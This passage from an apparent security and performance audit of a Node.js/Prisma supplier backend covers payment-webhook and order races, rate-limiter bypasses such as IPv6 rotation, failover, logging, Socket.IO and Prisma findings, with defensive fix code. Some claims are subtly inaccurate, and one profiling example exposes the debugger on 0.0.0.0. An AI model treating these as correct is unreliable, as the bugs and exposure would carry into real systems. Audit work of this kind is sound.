Time 51ms: B's $transaction commits → transaction marked COMPLETED AGAIN (update is idempotent)
                                       wallet +X EGP AGAIN → double credit
```

**Fix — Use unique constraint + upsert:**

```typescript
// Add unique constraint to Transaction.paymob_order_id in schema:
// @@unique([paymob_order_id])

// Then use upsert in a single atomic operation:
await prisma.$transaction(async (tx) => {
  const result = await tx.transaction.updateMany({
    where: {
      paymob_order_id: paymobOrderId,
      status: "PENDING", // Only update PENDING → COMPLETED
    },
    data: { status: "COMPLETED" },
  });

  if (result.count === 0) return; // Already processed or not found

  await tx.wallet.update({ data: { balance: { increment: amount } } });
});
```

### 10.2 Rate Limiter Initialization Race (TOCTOU)

**FINDING — RACE-02: Non-atomic rate limiter initialization**

- **Severity:** Medium
- **CWE:** CWE-362

```typescript
// limiter.middleware.ts:6-7
let rateLimitersInitialized = false;

export const initRateLimiters = async () => {
  if (rateLimitersInitialized) return; // ← Check
  // ... async DB query ...
  rateLimitersInitialized = true; // ← Set (not atomic with check)
};
```

In Node.js, this is a **cooperative concurrency** race (not thread-based) but still exploitable:

```
Request A: initRateLimiters() → initialized=false → await DB query starts
Request B: initRateLimiters() → initialized=still false → await DB query starts
Request A: DB returns → creates limiters → initialized=true
Request B: DB returns → OVERWRITES limiters (new instances, counters = 0)
```

**Fix:**

```typescript
let initPromise: Promise<void> | null = null;

export const initRateLimiters = async () => {
  if (!initPromise) {
    initPromise = _doInit().catch((err) => {
      initPromise = null; // Allow retry on failure
      throw err;
    });
  }
  return initPromise;
};

async function _doInit() {
  const settings = await prisma.applicationSetting.findFirst();
  // ... create limiters with settings ...
  rateLimitersInitialized = true;
}
```

### 10.3 Wallet Balance Race Condition

**FINDING — RACE-03: Supplier wallet debit correctness**

- **Severity:** Low — mitigated by Prisma `$transaction`

The wallet service uses `$transaction` for all balance mutations:

```typescript
await tx.wallet.update({
  where: { id: walletId, balance: { gte: amount } },
  data: { balance: { decrement: amount } },
});
```

The `balance: { gte: amount }` condition in the WHERE clause acts as an optimistic lock — if two concurrent debits run, only one can match (the DB UPDATE's WHERE clause is atomic). The second update affects 0 rows, which Prisma treats as success (returns `{ count: 0 }`). **There is no check that `count > 0`** — silent failure on insufficient balance.

**Fix:**

```typescript
const result = await tx.wallet.updateMany({
  where: { id: walletId, balance: { gte: amount } },
  data: { balance: { decrement: amount } },
});
if (result.count === 0) {
  throw new AppError(HttpStatusCode.BAD_REQUEST, "Insufficient balance");
}
```

### 10.4 Order Double-Accept Race

**FINDING — RACE-04: Order acceptance may allow two couriers to accept the same order**

- **Severity:** High (financial integrity)
- **Finding:** Without seeing the order acceptance code, the standard risk is:
  - Two couriers simultaneously accept the same order
  - Both `findFirst(order where status=AVAILABLE)` → both see AVAILABLE
  - Both update `status=ACCEPTED` — one wins the DB UPDATE, but which?
  - Without an optimistic lock (`WHERE status = "AVAILABLE"` in the UPDATE), both may "accept"
- **Recommendation:** Order status transitions must use atomic `updateMany` with status guard:

```typescript
const result = await prisma.order.updateMany({
  where: { id: orderId, status: "AVAILABLE" }, // Guard in WHERE
  data: { status: "ACCEPTED", courier_id: courierId },
});
if (result.count === 0) throw new AppError(409, "Order already taken");
```

---

## 11. Rate Limiting Testing

### 11.1 Rate Limiter Configuration Matrix

| Limiter         | Window           | Max Attempts  | Endpoints Protected                                               |
| --------------- | ---------------- | ------------- | ----------------------------------------------------------------- |
| Global          | 30 min (default) | 200 (default) | All endpoints                                                     |
| Register        | 30 min (default) | 5 (default)   | `/auth/register`, `/auth/apple-register`, `/auth/google-register` |
| Login           | 30 min (default) | 5 (default)   | `/auth/login`, `/auth/google-login`, `/auth/apple-login`          |
| Update Password | 30 min (default) | 5 (default)   | `/auth/update-password`                                           |
| Forget Password | 30 min (default) | 5 (default)   | `/auth/forget-password`                                           |

### 11.2 Unprotected Endpoints

| Endpoint                                | Expected Limiter                  | Actual Limiter |
| --------------------------------------- | --------------------------------- | -------------- |
| `POST /auth/verify-otp`                 | Dedicated OTP limiter             | ❌ Global only |
| `POST /auth/verify-forget-password-otp` | Dedicated OTP limiter             | ❌ Global only |
| `POST /auth/reset-password`             | Dedicated limiter                 | ❌ Global only |
| `POST /auth/refresh-token`              | Token refresh limiter             | ❌ Global only |
| `GET /profile/get-profile/:userId`      | No limiter needed (auth required) | ✅ Global only |

OTP verification endpoints should have a **per-userId** rate limiter (not per-IP) to prevent distributed brute force across multiple IPs.

### 11.3 Rate Limiter Bypass Vectors

**Bypass 1: IPv6 rotation**

The limiter has `ipv6Subnet: 56` for the global limiter:

```typescript
globalLimiter = rateLimit({ ipv6Subnet: 56, ... });
```

This correctly groups IPv6 addresses by /56 subnet. However, `registerLimiter`, `loginLimiter`, `updatePasswordLimiter`, and `forgetPasswordLimiter` do not have `ipv6Subnet` configured — they track the full IPv6 address. An attacker with an IPv6 range can generate unique addresses within their /48 allocation (256 /56 subnets) and bypass per-IP rate limits on these limiters.

**Fix:** Add `ipv6Subnet: 56` to all limiters.

**Bypass 2: DB-dependent initialization failure**

If MariaDB is unavailable at startup, `initRateLimiters()` throws and `rateLimitersInitialized` remains `false`. Every subsequent call to `applyGlobalLimiter` re-throws (or falls through to `undefined`). The app effectively runs with no rate limiting.

**Fix:** Use safe fallback defaults without DB:

```typescript
async function _doInit() {
  let settings = null;
  try {
    settings = await prisma.applicationSetting.findFirst();
  } catch (err) {
    logger.warn("[Limiter] DB unavailable — using hardcoded defaults");
  }
  // ... create limiters with settings ?? hardcoded_defaults ...
}
```

**Bypass 3: Restart resets counters**

As documented in Round 1. Redis store eliminates this.

### 11.4 Rate Limit Headers

Current config:

```typescript
standardHeaders: "draft-8",  // ✅ RateLimit-Policy, RateLimit headers
legacyHeaders: false,        // ✅ Disables X-RateLimit-* (non-standard)
```

Response when rate limited:

```http
HTTP/1.1 429 Too Many Requests
RateLimit-Limit: 200
RateLimit-Remaining: 0
RateLimit-Reset: 1746928800

{"message": "Too many requests. Limit: 200 per 30 minutes."}
```

This is correct and RFC 6585 / IETF draft-8 compliant. ✅

---

## 12. Failover & Recovery Testing

### 12.1 Component Failure Scenarios

**Scenario F-1: MariaDB Goes Down**

```
Current behavior:
  - Prisma throws PrismaClientInitializationError on next query
  - errorMiddleware catches → HTTP 500 on all API requests
  - Rate limiter re-initialization fails → no rate limiting on recovery
  - Prisma does NOT auto-reconnect with MariaDB adapter (verify with adapter docs)
  - PM2 may restart app, triggering cold start (clears all in-memory state)

Recovery:
  - DB comes back → Prisma reconnects on next query attempt
  - Rate limiter re-initialized (fresh counters)
  - Socket.IO connections dropped → reconnect storm (see §1)

MTTR (estimated): 30-120 seconds after DB restore
```

**Scenario F-2: Node.js Process Crash (OOM, unhandled exception)**

```
Current behavior:
  - PM2 detects crash → restarts process
  - Rate limit counters reset
  - Socket.IO state lost (all users appear offline then reconnect)
  - In-flight requests: none (process is dead)
  - Active DB connections: forcibly closed (MariaDB detects TCP close)

With restart: PM2 `--instances 4` cluster mode → 3 other workers serve requests
              → crash of 1 worker = 25% capacity reduction, not full outage

MTTR: < 5 seconds if PM2 cluster mode
```

**Scenario F-3: Cloudinary Unavailable (image uploads fail)**

```
Current behavior:
  - uploadSingleFile() throws
  - Error propagates to controller → HTTP 500
  - Temp file on disk is NOT cleaned up (no finally block for cleanup)
  - Disk usage grows with each failed upload

Fix:
  try {
    const result = await uploadSingleFile(...);
    return result;
  } finally {
    if (fs.existsSync(file.path)) fs.unlinkSync(file.path);  // Always cleanup
  }
```

**Scenario F-4: Firebase FCM Unavailable (push notifications fail)**

```
Current behavior:
  - notifyOtherParticipants() fails → caught and logged (fire-and-forget ✅)
  - Chat message still stored and delivered via Socket.IO ✅
  - Only push notification silently fails
  - No retry mechanism for failed notifications

Result: Acceptable degradation — core functionality works, push fails silently
Recommendation: Add BullMQ job for retry with exponential backoff
```

**Scenario F-5: Paymob Payment Gateway Unavailable**

```
Current behavior:
  - initPayment() call fails → HTTP 500 or Paymob error returned to client
  - No retry, no queue, no fallback payment method
  - Suppliers cannot top up wallet during outage

Recommendation: Queue payment initiation via BullMQ; return "payment queued" to client
```

### 12.2 Recovery Capabilities Summary

| Component           | Auto-Recovery      | Data Loss Risk      | MTTR           |
| ------------------- | ------------------ | ------------------- | -------------- |
| Node.js crash (PM2) | ✅ PM2 restart     | Rate limit counters | < 5s (cluster) |
| DB outage           | ✅ Reconnects      | None                | 30-120s        |
| Cloudinary outage   | ❌ No retry        | Temp file leak      | Manual         |
| Firebase outage     | ✅ Fire-and-forget | Notifications lost  | 0s (ignored)   |
| Paymob outage       | ❌ No retry        | Payments lost       | Manual         |
| Socket.IO restart   | ⚠ Reconnect storm  | Active chat state   | 30-300s        |

---

## 13. Logging & Monitoring Review

### 13.1 Current Logging Implementation

**What's logged:**

```typescript
// Pino structured logging ✅
logger.info({ userId, phone }, "[Auth] New supplier registered");
logger.warn(`Rate limit exceeded for IP: ${req.ip} on URL: ${req.originalUrl}`);
logger.error({ error }, "[Auth] Apple token verification failed");

// Prisma events ✅
prisma.$on("error", (e) => logger.error(...));
prisma.$on("warn", (e) => logger.warn(...));

// Request logger ✅ (requestLoggerMiddleware)
// Socket.IO events ✅ (connect/disconnect/room joins)
// Chat events ✅ (message sent, join/leave)
```

**What's missing:**

```
❌ Request correlation ID (no x-request-id propagation)
❌ Slow query logging (Prisma query events not subscribed)
❌ Outbound request logging (Cloudinary, Paymob, Firebase calls)
❌ Security event logging (failed auth, rate limit hits, IDOR attempts)
❌ Structured error response logging (error.handler.ts logs to console, not Pino)
❌ Audit trail for sensitive operations (profile update, wallet debit, account delete)
```

**LOG-01 — `console.log({ isDev })` in error handler**

```typescript
// src/core/handlers/error.handler.ts:20
console.log({ isDev }); // ← Fires on EVERY error response in production
```

Remove this immediately. Every error triggers a console.log, which bypasses Pino and goes to unstructured stdout.

### 13.2 Security Event Logging Gaps

| Event                          | Logged?                           | Should Log                                    |
| ------------------------------ | --------------------------------- | --------------------------------------------- |
| Failed login                   | ⚠ Via rate limit warn             | Full structured event with userId, IP, reason |
| Successful login               | ✅ Logged                         | —                                             |
| Registration                   | ✅ Logged                         | —                                             |
| Rate limit triggered           | ✅ Logged                         | —                                             |
| Invalid JWT                    | ❌ Not logged                     | Should log with IP                            |
| IDOR attempt (userId mismatch) | ❌ Not possible (no check exists) | Fix + log                                     |
| Invalid Paymob HMAC            | ✅ Logged                         | —                                             |
| Account deletion               | ❌ Not logged                     | Must log with who deleted whose account       |
| Password change                | ❌ Not logged                     | Security-critical event                       |

### 13.3 Structured Logging Improvements

```typescript
// Recommended structured log format for auth events:
logger.info(
  {
    event: "auth.login.success",
    userId: user.id,
    ip: req.ip,
    userAgent: req.headers["user-agent"],
    requestId: req.headers["x-request-id"],
  },
  "User logged in",
);

logger.warn(
  {
    event: "auth.login.failed",
    phone: maskedPhone, // Mask: "010****5678"
    ip: req.ip,
    reason: "invalid_password",
  },
  "Login failed",
);
```

### 13.4 Monitoring Stack Gap Analysis

| Monitoring Capability      | Status        | Required Tools                     |
| -------------------------- | ------------- | ---------------------------------- |
| Error rate alerting        | ❌ Missing    | Pino → Loki → Grafana alert        |
| Latency P95/P99 tracking   | ❌ Missing    | prom-client → Prometheus → Grafana |
| DB connection pool metrics | ❌ Missing    | Custom Prisma gauge                |
| Socket.IO connection count | ❌ Missing    | Custom counter                     |
| Disk usage (temp uploads)  | ❌ Missing    | Node.js OS metrics                 |
| Memory heap usage          | ❌ Missing    | prom-client processHeap            |
| Uptime/health probes       | ❌ No /health | Add health endpoint                |

---

## 14. Production Readiness Review

### 14.1 Pre-Production Checklist

| Item                                          | Status                 | Notes                            |
| --------------------------------------------- | ---------------------- | -------------------------------- |
| Server starts in production                   | ❌ **FAILS**           | `bootstrap.ts:58`                |
| All critical env vars validated at startup    | ❌ **FAILS**           | `?? ""` fallbacks                |
| Health check endpoint                         | ❌ Missing             | Needed for LB probes             |
| Graceful shutdown handler                     | ❌ Missing             | Needed for zero-downtime deploys |
| DB connection pool sized for prod             | ❌ `5` is too low      | Set to 50+                       |
| Rate limiting state persisted across restarts | ❌ In-memory           | Redis needed                     |
| Socket.IO state shared across instances       | ❌ In-memory           | Redis adapter needed             |
| All critical security headers                 | ✅ Helmet              | —                                |
| HTTPS enforced                                | ✅ Assumed via Nginx   | —                                |
| Secrets not hardcoded                         | ✅ Env vars            | But `?? ""` fallbacks risk       |
| Input validation                              | ✅ Zod throughout      | —                                |
| IDOR protection                               | ❌ Profile module      | Ownership checks needed          |
| No hardcoded test OTPs                        | ✅ All use createOtp() | —                                |
| JWT algorithm pinned                          | ✅ HS256 + issuer      | —                                |
| File upload size limit                        | ✅ 5MB                 | —                                |
| File upload MIME validation                   | ⚠ Extension + MIME     | No magic bytes                   |
| SVG allowed in upload                         | ❌ XSS risk            | Remove from allowlist            |
| Static temp dir served                        | ❌ Risk                | Remove static route              |
| Paymob HMAC verified                          | ✅                     | —                                |
| Paymob idempotency                            | ⚠ Partial              | Race condition in check          |
| Error details hidden in production            | ✅ `isDev` flag        | But `console.log` leaks          |
| Structured logging                            | ✅ Pino                | Missing slow queries             |
| No `console.log` in production paths          | ❌ error.handler.ts:20 | —                                |
| Dependency vulnerabilities checked            | ⚠ Not verified         | Run `npm audit`                  |
| Node.js version pinned                        | ⚠ Unknown              | Pin in `.nvmrc` / Dockerfile     |
| Express version stable                        | ❌ RC 5.2.1            | Use 4.x stable                   |

**Production Readiness Score: 14/27 items passing = 52%**

### 14.2 Zero-Downtime Deployment Requirements

For zero-downtime rolling deploys (Kubernetes, PM2 cluster reload):

1. **Graceful shutdown:** In-flight requests must complete before pod termination
2. **Health check:** Kubernetes `livenessProbe` and `readinessProbe` need `/health`
3. **Startup probe:** DB connectivity check before marking pod as ready
4. **Connection draining:** `httpServer.close()` stops accepting new connections while existing ones finish

**Current state:** None of these are implemented. Every deploy causes a brief outage.

---

## 15. Infrastructure & Deployment Review

### 15.1 Process Management

**Assumed: PM2 (based on Express + Node.js pattern)**

```javascript
// Recommended ecosystem.config.js:
module.exports = {
  apps: [
    {
      name: "tawreedat-supplier",
      script: "dist/server.js",
      instances: "max", // Use all CPU cores
      exec_mode: "cluster", // PM2 cluster mode
      max_memory_restart: "450M",
      node_args: "--max-old-space-size=512",
      env_production: {
        NODE_ENV: "production",
      },
      // Graceful reload settings:
      kill_timeout: 5000, // Wait 5s for graceful shutdown
      listen_timeout: 3000, // Wait 3s for app to bind
      wait_ready: true, // Wait for process.send("ready")
    },
  ],
};
```

**Missing:** `process.send("ready")` call after server binds — required for PM2 `wait_ready: true` to work correctly.

### 15.2 Containerization (Docker)

If deploying via Docker/Kubernetes:

```dockerfile
# Recommended Dockerfile best practices:
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM node:20-alpine
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
COPY dist/ ./dist/

# Security: non-root user
RUN addgroup -g 1001 -S nodejs && adduser -S nodejs -u 1001
USER nodejs

EXPOSE 3004
HEALTHCHECK --interval=30s --timeout=5s --start-period=10s \
  CMD curl -f http://localhost:3004/health || exit 1

CMD ["node", "--max-old-space-size=512", "dist/server.js"]
```

### 15.3 Environment Variable Management

**Concern:** 30+ environment variables with no startup validation. In Kubernetes, missing ConfigMap or Secret entries silently become empty strings.

**Recommendation:** Use a startup validation library or the custom `required()` helper from Round 1. Consider Doppler, HashiCorp Vault, or AWS Secrets Manager for secret rotation.

### 15.4 Database Migration Strategy

**FINDING — INFRA-01: No migration rollback strategy visible**

Prisma Migrate generates `migration.sql` files. For a B2B production database:

- Zero-downtime migrations require backward-compatible schema changes
- `NOT NULL` column additions must use `DEFAULT` or two-step migration
- No `prisma migrate deploy` hook visible in deployment pipeline

---

## 16. Code Architecture Review

### 16.1 Module Structure Assessment

```
src/
  modules/
    1. Registration & Authentication/   ← 1836-line auth.service.ts
    2. Profile Management/
    3. Order Management/
    4. Product Management/
    5. Reviews & Ratings/
    6. Notifications/
    7. Statistics & Earnings/
    8. About Us/
    9. Wallet Management/
```

**ARCH-01 — auth.service.ts is a 1836-line monolith**

- **Severity:** Medium (maintainability)
- The auth service handles: phone registration, email registration, Google OAuth, Apple Sign-In, OTP verification, password reset, token refresh, logout, and 2 social account linking flows — all in one class.
- **Impact:** High cyclomatic complexity, difficult to test in isolation, merge conflicts, cognitive load.
- **Recommendation:** Split into sub-services:
  ```
  auth/
    services/
      registration.service.ts    (register, verifyOtp)
      social-auth.service.ts     (google, apple)
      password.service.ts        (forget, reset, change, update)
      token.service.ts           (refresh, logout)
  ```

**ARCH-02 — Arrow functions as class methods**

```typescript
// auth.service.ts:42
register = async (req, res, next) => { ... };
```

Defining class methods as arrow function properties means each `new AuthService()` instance creates **N separate function objects** (one per method). With prototype methods (`register(req, res, next) { ... }`), all instances share the same prototype chain. This is a minor memory issue since services are typically singletons, but it's an anti-pattern in TypeScript classes.

**Fix:**

```typescript
class AuthService {
  async register(req: Request, res: Response, next: NextFunction) { ... }
}
// Then bind in controller: router.post("/register", authService.register.bind(authService));
// Or use: (req, res, next) => authService.register(req, res, next)
```

**ARCH-03 — No dependency injection**

Services `import { prisma }` directly. This makes unit testing impossible (cannot mock the DB) and couples implementation to Prisma. For a B2B platform, testability is important.

**Recommendation:** Constructor injection for testability:

```typescript
class AuthService {
  constructor(private readonly db = prisma) {}
  async register(...) { const user = await this.db.user.findUnique(...); }
}
```

**ARCH-04 — Number path prefixes in directory names**

`"1. Registration & Authentication"`, `"2. Profile Management"` — spaces and dots in directory names cause issues with:

- Shell scripts (require quoting)
- Some deployment systems
- TypeScript path aliases
- Auto-import suggestions in IDEs

**Recommendation:** Rename to `auth/`, `profile/`, `orders/`, etc.

**ARCH-05 — No test suite**

```bash
# No jest, vitest, mocha, or any test runner found in package.json
# No __tests__ directories
# No *.spec.ts or *.test.ts files
```

A production B2B platform with financial transactions (wallet, Paymob, commission) has zero automated tests. Any change to wallet logic, auth flow, or permission checks can silently break production with no safety net.

**Minimum required tests:**

- Auth flow: register → verify → login → logout → token invalidated
- Password reset: reset → old token rejected
- Wallet: credit, debit, idempotency, negative balance prevention
- IDOR protection: supplier A cannot access supplier B's profile (once fixed)

---

## 17. Memory Leak Detection

### 17.1 Memory Leak Candidates

**LEAK-01 — `socket.io-client` import in order.service.ts (Confirmed)**

```typescript
// order.service.ts:14
import { io } from "socket.io-client";
```

If `io` is imported but not used, this is dead code adding ~400KB bundle weight. If the module auto-connects on import (it doesn't — `io` is a factory function), it would create a persistent outbound connection. Even as dead code, it adds startup overhead and bundle size.

**Action:** Remove immediately. ✅ Confirmed dead code.

**LEAK-02 — connectedSockets Map: stale entries on abnormal disconnect**

As documented in §2 (END-04). Periodic cleanup required.

**LEAK-03 — Pino logger streams**

Pino uses stdout by default. No file streams to close → no leak. ✅

**LEAK-04 — Promise chains without `.catch()` in fire-and-forget patterns**

```typescript
// chat.events.ts:111-112
notifyOtherParticipants(data.chatId, userId, message).catch((err) =>
  logger.error(`[chat:send_message] notification error: ${err}`),
);
```

`.catch()` is attached — no unhandled promise rejection → no crash. ✅

**LEAK-05 — Temp file cleanup on upload failure**

```typescript
// auth.service.ts: image upload sequence
try {
  const { secure_url } = await uploadSingleFile({ fileLocation: file.path, ... });
  photo = secure_url;
} catch (err) {
  // No cleanup of file.path on failure!
  throw err;
}
```

If Cloudinary upload fails (network error, quota exceeded), the temp file in `uploads/temp/` is never deleted. Over time, failed uploads accumulate. On a small disk (< 10GB), this can cause disk exhaustion.

**Fix:**

```typescript
try {
  const { secure_url } = await uploadSingleFile({ fileLocation: file.path, ... });
  return secure_url;
} finally {
  try { fs.unlinkSync(file.path); } catch {}  // Always cleanup
}
```

### 17.2 Memory Profiling Recommendations

```bash
# Heap snapshot on demand:
kill -USR2 <pid>  # If --inspect enabled

# Live monitoring:
node --max-old-space-size=512 \
     --inspect=0.0.0.0:9229 \
     dist/server.js

# Connect Chrome DevTools → chrome://inspect → Take heap snapshot
# Look for: growing retainer trees, large string allocations
```

---

## 18. CPU / RAM Bottleneck Analysis

### 18.1 CPU-Intensive Operations

| Operation                        | CPU Cost             | Frequency                     | Concern             |
| -------------------------------- | -------------------- | ----------------------------- | ------------------- |
| `bcrypt.hash(password, 10)`      | ~100-200ms CPU-bound | Registration, password change | ⚠ Blocks event loop |
| `bcrypt.compare(password, hash)` | ~100-200ms CPU-bound | Every login                   | ⚠ Blocks event loop |
| JWT sign/verify                  | ~1ms                 | Every request                 | ✅ Negligible       |
| Apple JWT RS256 verify           | ~2-5ms               | Apple auth                    | ✅ OK               |
| HMAC calculation (Paymob)        | ~1ms                 | Each webhook                  | ✅ Negligible       |
| Zod validation                   | ~1-5ms               | Every request                 | ✅ OK               |
| DOMPurify sanitization           | Not present          | —                             | Consider adding     |

**CPU-01 — bcrypt blocks the event loop**

`bcrypt.hash` and `bcrypt.compare` with 10 rounds each take 100-200ms on a modern server. Node.js's `bcrypt` package runs in a libuv thread pool (not the main event loop thread), so they are **technically non-blocking**. However, the thread pool default size is 4 (`UV_THREADPOOL_SIZE=4`). Under heavy login/registration load:

```
UV_THREADPOOL_SIZE=4 (default)
Simultaneous bcrypt operations: 4 running, remaining queue

10 concurrent logins:
  - 4 bcrypt.compare run in parallel in thread pool
  - 6 wait in queue
  - Each batch takes ~150ms
  - Total: 150ms × 3 batches = 450ms for 10 logins

100 concurrent logins:
  - Batches of 4: 25 batches × 150ms = 3750ms for all to complete
  - P99 latency: ~3.75 seconds just for password comparison
```

**Fix:**

```bash
# Increase thread pool size (set before node starts):
UV_THREADPOOL_SIZE=16 node dist/server.js
```

Or use `argon2` (more parallelism-friendly, native async).

**CPU-02 — Single-threaded Node.js**

JavaScript execution is single-threaded. CPU-heavy operations (complex Zod schemas, synchronous string processing) block all other requests during execution. Node.js cluster mode (`pm2 start -i max`) runs N processes = N parallel event loops, effectively using all CPU cores.

### 18.2 RAM Usage Analysis

**Baseline memory estimate (single process):**

| Component                            | Estimated RAM           |
| ------------------------------------ | ----------------------- |
| Node.js runtime + V8                 | ~40MB                   |
| Express + middleware stack           | ~20MB                   |
| Socket.IO server                     | ~10MB                   |
| Prisma client (compiled schema)      | ~15MB                   |
| In-memory rate limiter store         | 1-50MB (load-dependent) |
| connectedSockets Map (1000 users)    | ~1MB                    |
| Pino logger                          | ~5MB                    |
| **Total baseline**                   | **~92MB**               |
| **Total at 1000 socket connections** | **~100-150MB**          |
| **Total at peak with rate limiter**  | **~200-300MB**          |

**RAM-01 — No `--max-old-space-size` limit set**

Without this flag, the process can use up to 1.4GB before V8 forces GC. On a 2GB server running other services (MariaDB, Nginx), this leaves only 600MB for the DB and OS. Set `--max-old-space-size=512` to bound the Node.js process and let MariaDB use the remainder.

**RAM-02 — Prisma query cache**

Prisma 5+ (and 7) maintains an internal statement cache. This is beneficial but can hold memory. No configuration needed — it's bounded internally.

---

## 19. Socket.IO Scalability Analysis

### 19.1 Current Architecture Limitations

```typescript
// socketio.server.ts:15
ioServer = new Server(httpServer, { cors: { origin: "*" } });

export let connectedSockets = new Map<number, string[]>();
```

**Single-process in-memory state:**

- All connected socket IDs stored in process memory
- `users:get_online_users` queries this Map
- On process restart or crash: all data lost
- With 2+ processes (PM2 cluster): each process has its own Map → inconsistent state

### 19.2 Socket.IO Scalability Metrics

| Metric                     | Current Capacity    | With Redis Adapter               |
| -------------------------- | ------------------- | -------------------------------- |
| Max concurrent connections | ~5,000/instance     | ~50,000+ with horizontal scaling |
| Multi-instance support     | ❌                  | ✅                               |
| Message delivery guarantee | ❌ (in-memory only) | ✅ (Redis pub/sub)               |
| Presence accuracy          | ❌ (per-instance)   | ✅                               |
| Recovery after restart     | ❌ State lost       | ⚠ State in Redis (TTL)           |

### 19.3 Chat Event Performance Analysis

**SOCKET-01 — `readMessages` bulk update without index**

```typescript
// chat.events.ts:163-170
await prisma.chatMessage.updateMany({
  where: {
    chat_id: data.chatId,
    is_read: false,
    deleted_at: null,
    sender_id: { not: userId },
  },
  data: { is_read: true, read_at: now },
});
```

Without a composite index on `(chat_id, is_read, sender_id, deleted_at)`, this becomes a full scan of all messages in the chat. For high-volume chats (100+ messages), this runs slowly and holds a DB connection.

**SOCKET-02 — `users:get_online_users` returns unbounded list**

```typescript
// socketio.server.ts:104
callback({ users: Array.from(connectedSockets.keys()) });
```

If 10,000 users are online, this serializes and sends 10,000 user IDs in a single Socket.IO event. No pagination, no limit. Under load:

- Large JSON payload → CPU for serialization
- Network bandwidth spike
- Client parsing overhead

**Fix:** Add pagination or limit:

```typescript
socket.on("users:get_online_users", (data: { limit?: number }, callback) => {
  const allUsers = Array.from(connectedSockets.keys());
  const limit = Math.min(data?.limit ?? 100, 1000);
  callback({ users: allUsers.slice(0, limit), total: allUsers.length });
});
```

### 19.4 Socket.IO Security Hardening Checklist

| Item                              | Status                                          |
| --------------------------------- | ----------------------------------------------- |
| Auth middleware on connection     | ✅ JWT verified                                 |
| CORS restricted to known origins  | ❌ `origin: "*"`                                |
| Chat room membership validated    | ✅ DB check on join/send                        |
| Typing event membership validated | ❌ Missing                                      |
| Rate limiting on socket events    | ❌ None                                         |
| Message content sanitized         | ❌ Raw content stored/emitted                   |
| File/image messages validated     | ❚ Type field accepted as string (no validation) |
| Max message length enforced       | ❌ Not visible                                  |

**SOCKET-03 — No per-socket event rate limiting**

A malicious authenticated user can emit thousands of `chat:send_message` events per second, flooding the DB with inserts. Each message creates a `prisma.chatMessage.create` DB call.

**Fix:** Add per-socket rate limiting:

```typescript
// Simple token-bucket per socket:
const MESSAGE_RATE_LIMIT = 10; // per second
const userMessageCounts = new Map<number, number>();

socket.on("chat:send_message", async (data, callback) => {
  const count = userMessageCounts.get(userId) ?? 0;
  if (count >= MESSAGE_RATE_LIMIT) {
    return callback?.({ error: "Too many messages" });
  }
  userMessageCounts.set(userId, count + 1);
  setTimeout(
    () =>
      userMessageCounts.set(userId, (userMessageCounts.get(userId) ?? 1) - 1),
    1000,
  );
  // ... handle message ...
});
```

---

## 20. Prisma Optimization Review

### 20.1 Query Optimization Opportunities

**PRISMA-01 — Always use `select` projections**

Multiple queries fetch entire records when only specific fields are needed:

```typescript
// Current (fetches ALL user fields):
const user = await prisma.user.findUnique({ where: { phone } });

// Optimized (fetches only needed fields):
const user = await prisma.user.findUnique({
  where: { phone },
  select: { id: true, password: true, is_verified: true, role_id: true },
});
```

For large records with Cloudinary URLs, JSON fields, or TEXT columns, projection can reduce data transfer by 60-80%.

**PRISMA-02 — `$transaction` for related mutations**

Wallet operations correctly use `$transaction`. ✅

Logout uses two separate `prisma.user.update` calls (password_last_updated then fcm_token) — these could be combined:

```typescript
// Current (2 queries):
await prisma.user.update({
  where: { id: user.id },
  data: { password_last_updated: new Date() },
});
await prisma.user.update({ where: { id: user.id }, data: { fcm_token: null } });

// Optimized (1 query):
await prisma.user.update({
  where: { id: user.id },
  data: { password_last_updated: new Date(), fcm_token: null },
});
```

**PRISMA-03 — Pagination enforcement**

The `listOrders` endpoint defaults to `limit(10).skip(0)` but accepts user overrides via query params. Without a maximum limit cap in `FeatureApi`, a client can request `limit=100000` and return millions of rows. Verify `FeatureApi` enforces a maximum page size (e.g., 100).

**PRISMA-04 — `prisma.$transaction([...])` vs `prisma.$transaction(async (tx) => ...)`**

Order listing uses interactive transactions (array form):

```typescript
const [orders, totalOrders] = await prisma.$transaction([
  prisma.order.findMany(queryOptions),
  prisma.order.count({ where: queryOptions.where }),
]);
```

The array form creates a serializable transaction unnecessarily. For read-only operations, two separate queries are equivalent and avoid transaction overhead:

```typescript
const [orders, totalOrders] = await Promise.all([
  prisma.order.findMany(queryOptions),
  prisma.order.count({ where: queryOptions.where }),
]);
```

**PRISMA-05 — Prisma version vs MariaDB adapter compatibility**

Prisma 7.3.0 with `@prisma/adapter-mariadb` is a preview feature. Verify the MariaDB adapter supports all Prisma features used (including `$transaction`, `updateMany`, `aggregate`). Some adapter features lag behind the main client.

### 20.2 Schema Recommendations

```prisma
// Recommended additions to schema.prisma:

model Order {
  // Add:
  @@index([supplier_id, status, created_at])
  @@index([created_at])
}

model ChatMessage {
  // Add:
  @@index([chat_id, is_read, sender_id])
  @@index([chat_id, created_at])
}

model ChatParticipant {
  // Add:
  @@index([chat_id, user_id, left_at])
}

model Transaction {
  // Change to unique (enables atomic idempotency):
  @@unique([paymob_order_id])
}

model UserVerify {
  // Add:
  @@index([user_id])
}
```

---

## 21. Consolidated Issue Registry

### Critical Issues

| ID      | Title                                      | File                        | Round |
| ------- | ------------------------------------------ | --------------------------- | ----- |
| CRIT-01 | Server never starts in production          | `bootstrap.ts:58`           | R1    |
| CRIT-02 | IDOR on all profile endpoints              | `profile.controller.ts`     | R1    |
| CRIT-03 | DB connection pool = 5 (too low)           | `prisma.ts:18`              | R1    |
| CRIT-04 | Password reset doesn't invalidate tokens   | `auth.service.ts:1795-1800` | R1    |
| RACE-01 | Paymob webhook race → double wallet credit | `wallet.service.ts`         | R2    |

### High Issues

| ID        | Title                                     | File                     | Round |
| --------- | ----------------------------------------- | ------------------------ | ----- |
| SEC-T-01  | Upload lacks magic byte validation        | `upload.ts`              | R2    |
| SEC-T-02  | XSS via unsanitized chat messages         | `chat.events.ts:77`      | R2    |
| SEC-T-04  | Temp upload dir served statically         | `bootstrap.ts:55`        | R2    |
| PEN-01    | OTP brute-forceable (no per-OTP limiter)  | `auth.service.ts`        | R2    |
| RACE-04   | Order double-accept race condition        | `order.service.ts`       | R2    |
| AUTH-01   | Role DB query on every authorized request | `authorize.middlewar.ts` | R2    |
| SOCKET-03 | No per-socket message rate limiting       | `chat.events.ts`         | R2    |
| CPU-01    | Low UV_THREADPOOL_SIZE under bcrypt load  | Environment              | R2    |
